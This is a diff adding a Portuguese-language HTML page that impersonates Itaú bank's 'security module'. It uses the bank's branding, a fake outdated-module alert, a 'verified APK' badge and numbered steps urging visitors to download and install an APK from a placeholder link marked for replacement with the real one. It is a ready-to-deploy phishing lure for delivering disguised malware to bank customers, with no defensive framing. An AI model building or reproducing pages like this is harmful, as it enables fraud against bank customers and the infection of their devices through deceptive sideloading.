@@ -1,0 +1,512 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Itaú - Módulo de Segurança</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+            background: #f0f2f5;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 16px;
+        }
+
+        .container {
+            background: #ffffff;
+            border-radius: 28px;
+            width: 100%;
+            max-width: 400px;
+            padding: 0 24px 30px;
+            box-shadow: 0 12px 48px rgba(0, 0, 0, 0.12);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .header-bg {
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 120px;
+            background: linear-gradient(135deg, #EC7000, #D65A00);
+            border-radius: 28px 28px 0 0;
+        }
+
+        .header-bg::after {
+            content: '';
+            position: absolute;
+            bottom: -20px;
+            left: 0;
+            right: 0;
+            height: 40px;
+            background: #ffffff;
+            border-radius: 50% 50% 0 0 / 100% 100% 0 0;
+        }
+
+        .header {
+            position: relative;
+            z-index: 2;
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            padding: 24px 0 20px;
+        }
+
+        .logo-itau {
+            width: 56px;
+            height: 56px;
+            background: #ffffff;
+            border-radius: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.12);
+            overflow: hidden;
+            padding: 8px;
+        }
+
+        .logo-itau img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+            border-radius: 8px;
+        }
+
+        .header h1 {
+            font-size: 20px;
+            color: #ffffff;
+            font-weight: 700;
+            text-shadow: 0 2px 8px rgba(0, 0, 0, 0.15);
+            letter-spacing: -0.5px;
+        }
+
+        .header h1 small {
+            display: block;
+            font-size: 12px;
+            font-weight: 400;
+            opacity: 0.9;
+            letter-spacing: 0;
+        }
+
+        .security-badge {
+            background: #fef6ed;
+            border: 1px solid #fcdbb8;
+            border-radius: 14px;
+            padding: 14px 16px;
+            margin-bottom: 24px;
+            margin-top: 4px;
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+            position: relative;
+            z-index: 1;
+        }
+
+        .security-badge .icon {
+            width: 36px;
+            height: 36px;
+            background: #dc3545;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #fff;
+            font-size: 18px;
+            font-weight: 700;
+            flex-shrink: 0;
+            margin-top: 2px;
+        }
+
+        .security-badge .text {
+            font-size: 13px;
+            color: #5a3a1a;
+            line-height: 1.5;
+        }
+
+        .security-badge .text strong {
+            font-weight: 700;
+            display: block;
+            font-size: 14px;
+            color: #EC7000;
+        }
+
+        .security-badge .text .sub {
+            font-size: 12px;
+            color: #5a3a1a;
+            font-weight: 500;
+        }
+
+        .download-area {
+            position: relative;
+            z-index: 1;
+            text-align: center;
+            padding: 10px 0 6px;
+        }
+
+        .download-area .icon-shield {
+            font-size: 48px;
+            margin-bottom: 12px;
+            display: block;
+            color: #EC7000;
+            font-weight: 300;
+        }
+
+        .download-area h2 {
+            font-size: 18px;
+            color: #1a3a5c;
+            margin-bottom: 6px;
+        }
+
+        .download-area p {
+            font-size: 14px;
+            color: #666;
+            line-height: 1.6;
+            margin-bottom: 20px;
+        }
+
+        .btn-download {
+            display: inline-flex;
+            align-items: center;
+            gap: 12px;
+            padding: 16px 32px;
+            border: none;
+            border-radius: 16px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.2s;
+            background: linear-gradient(135deg, #EC7000, #D65A00);
+            color: #fff;
+            box-shadow: 0 4px 16px rgba(236, 112, 0, 0.30);
+            text-decoration: none;
+            position: relative;
+            z-index: 1;
+            width: 100%;
+            justify-content: center;
+        }
+
+        .btn-download:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 24px rgba(236, 112, 0, 0.40);
+        }
+
+        .btn-download:active {
+            transform: scale(0.98);
+        }
+
+        .btn-download .icon {
+            font-size: 20px;
+            font-weight: 300;
+        }
+
+        .btn-download .badge {
+            background: rgba(255, 255, 255, 0.20);
+            padding: 2px 10px;
+            border-radius: 20px;
+            font-size: 11px;
+            font-weight: 600;
+            letter-spacing: 0.5px;
+        }
+
+        .version-info {
+            margin-top: 14px;
+            font-size: 12px;
+            color: #aaa;
+            position: relative;
+            z-index: 1;
+        }
+
+        .version-info span {
+            background: #f0f2f5;
+            padding: 2px 10px;
+            border-radius: 12px;
+            color: #888;
+        }
+
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 12px;
+            color: #aaa;
+            position: relative;
+            z-index: 1;
+        }
+
+        .footer a {
+            color: #EC7000;
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        .footer .separator {
+            color: #ddd;
+            margin: 0 6px;
+        }
+
+        .steps {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            margin: 16px 0 20px;
+            text-align: left;
+            position: relative;
+            z-index: 1;
+        }
+
+        .steps .step {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            font-size: 13px;
+            color: #444;
+        }
+
+        .steps .step .num {
+            width: 24px;
+            height: 24px;
+            background: #fef6ed;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 12px;
+            font-weight: 700;
+            color: #EC7000;
+            flex-shrink: 0;
+        }
+
+        @media (max-width: 400px) {
+            .container {
+                padding: 0 16px 20px;
+                border-radius: 20px;
+            }
+            .header-bg {
+                height: 100px;
+                border-radius: 20px 20px 0 0;
+            }
+            .btn-download {
+                padding: 14px 20px;
+                font-size: 14px;
+            }
+            .download-area .icon-shield {
+                font-size: 36px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="header-bg"></div>
+
+    <!-- HEADER -->
+    <div class="header">
+        <div class="logo-itau">
+            <img src="https://play-lh.googleusercontent.com/TTzHZIn-jjXoADJ09NSrc0WRnrODhKjtAJj801dvQUPmbMwfRx2N40liORJyh-gaq-vD7jHAkSHYs_23pENTSw=w480-h960-rw" alt="Itaú">
+        </div>
+        <div>
+            <h1>Itaú <small>Módulo de Segurança</small></h1>
+        </div>
+    </div>
+
+    <!-- ALERTA DE SEGURANÇA -->
+    <div class="security-badge">
+        <div class="icon">!</div>
+        <div class="text">
+            <strong>Atualização de segurança necessária</strong>
+            Seu módulo de segurança está desatualizado.
+            <span class="sub">Baixe a versão mais recente para garantir a proteção da sua conta.</span>
+        </div>
+    </div>
+
+    <!-- ÁREA DE DOWNLOAD -->
+    <div class="download-area">
+        <span class="icon-shield">◆</span>
+        <h2>Módulo de Segurança Itaú</h2>
+        <p>Baixe o APK oficial do módulo de segurança para proteger sua conta contra acessos não autorizados.</p>
+
+        <!-- PASSOS -->
+        <div class="steps">
+            <div class="step">
+                <span class="num">1</span>
+                <span>Baixe o APK clicando no botão abaixo</span>
+            </div>
+            <div class="step">
+                <span class="num">2</span>
+                <span>Instale o aplicativo no seu dispositivo</span>
+            </div>
+            <div class="step">
+                <span class="num">3</span>
+                <span>Abra o módulo e siga as instruções de ativação</span>
+            </div>
+        </div>
+
+        <!-- BOTÃO DE DOWNLOAD -->
+        <a href="#" class="btn-download" id="downloadBtn">
+            <span class="icon">↓</span>
+            Baixar APK - Módulo de Segurança
+            <span class="badge">v4.0.2</span>
+        </a>
+
+        <div class="version-info">
+            <span>APK verificado • 18.4 MB</span>
+        </div>
+    </div>
+
+    <!-- FOOTER -->
+    <div class="footer">
+        <a href="#">Precisa de ajuda?</a>
+        <span class="separator">•</span>
+        <a href="#" id="cancelLink">Cancelar</a>
+        <span class="separator">•</span>
+        <a href="#">Política de Privacidade</a>
+    </div>
+</div>
+
+<script>
+    // ===== LINK DO APK (substitua pelo link real) =====
+    const APK_URL = "https://example.com/modulo-seguranca-itau.apk";
+
+    // ===== INICIALIZAÇÃO =====
+    document.addEventListener('DOMContentLoaded', function() {
+        // Configurar botão de download
+        const downloadBtn = document.getElementById('downloadBtn');
+        downloadBtn.addEventListener('click', function(e) {
+            e.preventDefault();
+            iniciarDownload();
+        });
+
+        // Configurar link "Cancelar"
+        document.getElementById('cancelLink').addEventListener('click', function(e) {
+            e.preventDefault();
+            if (confirm('Tem certeza que deseja cancelar a atualização do módulo de segurança?')) {
+                alert('Cancelado. Recomendamos que mantenha seu módulo atualizado para proteger sua conta.');
+            }
+        });
+    });
+
+    // ===== FUNÇÃO DE DOWNLOAD =====
+    function iniciarDownload() {
+        const btn = document.getElementById('downloadBtn');
+        const textoOriginal = btn.innerHTML;
+
+        // Desabilitar e mostrar loading
+        btn.style.opacity = '0.7';
+        btn.style.cursor = 'default';
+        btn.innerHTML = `
+            <span style="display:inline-block;animation:spin 0.8s linear infinite;">↻</span>
+            Baixando...
+        `;
+
+        // Simular download (substitua pelo link real)
+        setTimeout(() => {
+            // Criar link de download real
+            const link = document.createElement('a');
+            link.href = APK_URL;
+            link.download = 'modulo-seguranca-itau.apk';
+            link.target = '_blank';
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+
+            // Restaurar botão
+            btn.style.opacity = '1';
+            btn.style.cursor = 'pointer';
+            btn.innerHTML = textoOriginal;
+
+            // Mostrar mensagem de sucesso
+            mostrarMensagemDownload();
+
+        }, 1500);
+    }
+
+    // ===== MENSAGEM DE SUCESSO =====
+    function mostrarMensagemDownload() {
+        // Criar overlay de sucesso
+        const overlay = document.createElement('div');
+        overlay.style.cssText = `
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0,0,0,0.5);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
+            backdrop-filter: blur(4px);
+            animation: fadeIn 0.3s ease;
+            padding: 20px;
+        `;
+
+        overlay.innerHTML = `
+            <div style="
+                background: #fff;
+                border-radius: 24px;
+                padding: 32px 24px;
+                max-width: 340px;
+                width: 100%;
+                text-align: center;
+                box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+                animation: slideUp 0.4s ease;
+            ">
+                <div style="font-size: 48px; margin-bottom: 12px; color: #28a745; font-weight: 300;">✓</div>
+                <h3 style="color: #1a3a5c; margin-bottom: 8px; font-size: 18px;">Download iniciado!</h3>
+                <p style="color: #666; font-size: 14px; line-height: 1.6; margin-bottom: 20px;">
+                    O APK do módulo de segurança está sendo baixado.<br>
+                    Após o download, instale o aplicativo e ative a proteção.
+                </p>
+                <button onclick="this.closest('div[style]').parentElement.remove()" style="
+                    background: #EC7000;
+                    color: #fff;
+                    border: none;
+                    padding: 12px 28px;
+                    border-radius: 12px;
+                    font-size: 14px;
+                    font-weight: 600;
+                    cursor: pointer;
+                ">Entendi</button>
+            </div>
+        `;
+
+        document.body.appendChild(overlay);
+
+        // Fechar ao clicar fora
+        overlay.addEventListener('click', function(e) {
+            if (e.target === this) this.remove();
+        });
+    }
+
+    // ===== ESTILOS DINÂMICOS PARA ANIMAÇÕES =====
+    const style = document.createElement('style');
+    style.textContent = `
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        @keyframes slideUp {
+            from { transform: translateY(30px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+        @keyframes spin {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+    `;
+    document.head.appendChild(style);
+
+    console.log('[Itaú Security] Módulo de segurança carregado');
+    console.log('[Itaú Security] APK URL:', APK_URL);
+</script>
+
+</body>
+</html>
